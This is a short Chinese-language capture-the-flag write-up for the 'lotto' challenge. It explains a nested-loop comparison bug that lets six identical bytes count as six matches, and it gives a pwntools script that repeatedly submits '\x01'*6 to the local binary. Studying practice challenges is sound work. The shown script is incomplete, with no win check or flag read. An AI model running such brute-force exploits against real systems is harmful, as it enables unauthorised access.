## Source code
蠻無聊的題目，問題在於

```
// calculate lotto score
int match = 0, j = 0;
for(i=0; i<6; i++){
	for(j=0; j<6; j++){
		if(lotto[i] == submit[j]){
			match++;
		}
	}
}
```

題目要求我們給 6 bytes，他會存入 unsigned char[6] submit 裏面。

這支程式會亂數產生 6 bytes 的樂透號碼，然後用上述 double for-loop 進行比對。


很明顯這個邏輯是有問題的，假設我們輸入 1 1 1 1 1 1

然後其中一個開獎的號碼是 1

那 match 就會被遞增 6次，match == 6

## Pwn
機率問題，所以我們可以用 pwntools 編寫 exploit 然後 scp 上傳到 server:/tmp 下

記得在 /home/lotto 底下執行，否則 cat 會提示當前目錄找不到 flag 文件
```
#!/usr/bin/env python2.7

from pwn import *

context.log_level = 'debug'
conn = process('/home/lotto/lotto')

while True:
    conn.recvuntil('3. Exit')
    conn.sendline('1')

    conn.recvuntil('Submit your')
    conn.sendline("\x01" * 6)

    conn.recvuntil('bad luck')
```
